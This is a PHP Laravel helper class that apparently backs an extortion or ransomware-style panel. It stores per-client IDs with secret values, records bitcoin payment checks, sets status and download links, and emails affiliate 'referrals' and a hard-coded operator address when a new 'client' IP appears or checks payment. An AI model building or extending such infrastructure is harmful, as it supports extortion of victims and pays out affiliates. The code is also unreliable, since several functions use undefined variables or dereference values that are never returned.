<?php
namespace App\Helpers;

use App\Helpers\Contracts\HelperContract; 
use Crypt;
use Carbon\Carbon; 
use Mail;
use Auth;
use App\Records; 
use App\Payments; 
use App\Referrals; 

class Helper implements HelperContract
{

          /**
           * Sends an email(blade view or text) to the recipient
           * @param String $to
           * @param String $subject
           * @param String $data
           * @param String $view
           * @param String $image
           * @param String $type (default = "view")
           **/
           function sendEmail($to,$subject,$data,$view,$type="view")
           {
                   if($type == "view")
                   {
                     Mail::send($view,$data,function($message) use($to,$subject){
                           $message->from('info@worldlotteryusa.com',"Admin");
                           $message->to($to);
                           $message->subject($subject);
                          if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
						  $message->getSwiftMessage()
						  ->getHeaders()
						  ->addTextHeader('x-mailgun-native-send', 'true');
                     });
                   }

                   elseif($type == "raw")
                   {
                     Mail::raw($view,$data,function($message) use($to,$subject){
                           $message->from('info@worldlotteryusa.com',"Admin");
                           $message->to($to);
                           $message->subject($subject);
                           if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
                     });
                   }
           }          
		   
		   function addRecord($data)
		   {		   
		     $mokije = $data['mokije'];
					  
	         $record = Records::where('gg',$data['randd'])->first();
							
					    if($record == null)
			            {
    			           $record = Records::create(['gg' =>$data['randd'],
			                                       'mokije' =>$mokije,
								  	           ]);
			            }
				      
					  //return $record;
		   }
		   
		   function addPayment($data)
		   {
              $bill = Payments::where('gg',$data['randd'])
			                  ->where('ref',$data['r'])
							  ->first();
              
              if($bill == null)
			  {
				  $r = Referrals::where('id',$data['r'])->first();
				  if($r == null) $r = Referrals::where('email','mails4davidslogan@gmail.com')->first();
			      $bill = Payments::create(['gg' =>$data['randd'],
			                           'ref' =>$r->id,
			                           'status' =>"abra",
			                           'link' =>"zip",
									  ]);
				  $location = getenv("REMOTE_ADDR");		  
				  $s = "**Rambo** New Client, IP ".$location.": ".date("h:i A jS F, Y");
               $rcpt = $r->email;;
               $randd = $data["randd"];
               $mokije = $data["mokije"];
                      
               $this->sendEmail($rcpt,$s,['randd' => $randd,'jabbing' => "original",'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email,'jabbing' => "soji"],'emails.heh_alert','view');
		      }  
		       
		   }
		   
		   function addReferral($data)
		   {
              $r = Referrals::where('email',$data['email'])->first();
              
              if($r == null)
			  {
				  $r = Referrals::create(['email' =>$data['email'] ]);
		      }  
		   }		  
		   
		   function markPayment($data)
		   {			   
			   $bill = Payments::where('gg',$data['gg'])->first();
			   $ret = "zip";
			   
			   if($bill != null && ($data['status'] == "quee" || $data['status'] == "abra"))
			   {
				   $bill->update(['status' => $data['status'],'link' => $data['link'] ]);
     			   $ret = "ok";  			   
			   }
			   
			   return $ret;
		   }

		   function getRecords()
		   {		   
		     $ret = [];
			   $records =  Records::where('id','>',0)->get();
			   
			   if($records != null && count($records) > 0)
			   {
				   foreach($records as $r)
				   {
					   $temp = [];
					   $temp['id'] = $r->id;
					   $temp['gg'] = $r->gg;
					   $temp['mokije'] = $r->mokije;
					   array_push($ret,$temp);
				   }
			   }
			   
			   return $ret;
		   }
		   
		   function getPayments()
		   {		   
		     $ret = [];
			   $bills =  Payments::where('id','>',0)->get();
			   
			   if($bills != null && count($bills) > 0)
			   {
				   foreach($bills as $b)
				   {
					   $temp = [];
					   $temp['id'] = $b->id;
					   $temp['gg'] = $b->gg;
					   $rem = Referrals::where('id',$b->ref)->first();
					   $temp['r'] = ($rem == null) ? "mails4davidslogan@gmail.com" : $rem->email;
					   $temp['status'] = $b->status;
					   $temp['link'] = $b->link;
					   $temp['date'] = $b->created_at->format("jS F, Y h:i A");
					   array_push($ret,$temp);
				   }
			   }
			   
			   return $ret;
		   }
		   
		   function getReferrals()
		   {		   
		     $ret = [];
			   $refs =  Referrals::where('id','>',0)->get();
			   
			   if($refs != null && count($refs) > 0)
			   {
				   foreach($refs as $r)
				   {
					   $temp = [];
					   $temp['id'] = $r->id;
					   $temp['email'] = $r->email;					 
					   $temp['date'] = $r->created_at->format("jS F, Y h:i A");
					   array_push($ret,$temp);
				   }
			   }
			   
			   return $ret;
		   }
		   
		   function getRecord($gg)
		   {		   
		     $ret = [];
			   $record =  Records::where('gg',$gg)->get();
			   
			   if($record != null)
			   {
					   $temp = [];
					   $temp['id'] = $r->id;
					   $temp['gg'] = $r->gg;
					   $temp['mokije'] = $r->mokije;
			   }
			   
			   $ret = $temp;
			   return $ret;
		   }
		   
		   function deleteRecords($gg)
		   {		   
			   $record =  Records::where('gg',$gg)->get();
			   
			   if($record != null)
			   {
					   $r->delete();
			   }
		   }
		   
		   function deletePayment($gg)
		   {		   
			   $bill =  Payments::where('gg',$gg)->first();
			   
			   if($bill != null)
			   {
				  $bill->delete();
			   }
		   }
		   
		   function getPaymentStatus($gg)
		   {		   
			   $ret =  Payments::where('gg',$gg['randd'])
			                   ->where('ref',$gg['r'])
							   ->first();
			   if($ret == null)
			   {
				   $gg['gg'] = $gg['randd'];
                   $ret = $this->addRecord($gg);				   
                   $ret = $this->addPayment($gg);				   
			   }
			 
			   $s = "Client just checked payment: ".date("h:i A jS F, Y");
               $randd = $gg["randd"];
               $btc = $gg["btc"];
               $r = $ret->email;
                      
               $this->sendEmail($r,$s,['randd' => $randd,'btc' => $btc,'r' => $r],'emails.cp_alert','view');
               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'btc' => $btc,'r' => $r],'emails.cp_alert','view');
					   
			   $rt = ["s" => $ret->status,"l" => $ret->link];
			   return $rt;
		   }
		   
		   
		   function getMokije($gg)
		   {		   
		     $ret = "zip";
			 $record = Records::where('gg',$gg)->get();
			   
			   if($record != null)
			   {
				   $ret = $record->mokije;
			   }
			   
			   return $ret;
		   }
   
}
?>
